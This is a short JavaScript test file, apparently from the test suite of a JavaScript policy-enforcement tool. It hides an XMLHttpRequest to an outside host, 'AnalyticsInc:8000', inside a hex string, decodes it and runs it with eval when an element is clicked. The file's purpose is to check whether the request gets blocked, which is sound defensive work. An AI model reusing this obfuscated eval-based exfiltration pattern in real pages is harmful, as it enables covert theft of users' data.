// exfil_test_hex.js
function exfiltrate_key_history() {
  var exp = "786d6c687474703d6e657720584d4c487474705265717565737428293b0a786d6c687474702e6f70656e2822474554222c2022687474703a2f2f416e616c7974696373496e633a383030302f7375626d697373696f6e2e68746d6c3f746573743d686578222c2074727565293b0a786d6c687474702e73656e64286e756c6c293b";
  var dec = "";
  var i$$1 = 0;
  var v0 = i$$1 < exp.length;
  for (;v0;) {
    dec = dec + String.fromCharCode(JAM.call(parseInt, null, [JAM.call(exp.substr, exp, [i$$1, 2], JAM.policy.p1), 16], JAM.policy.p1));
    i$$1 = i$$1 + 2;
    v0 = i$$1 < exp.length;
  }
  if (JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + dec + " }");
  } else {
    JAM.call(eval, null, [dec]);
  }
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

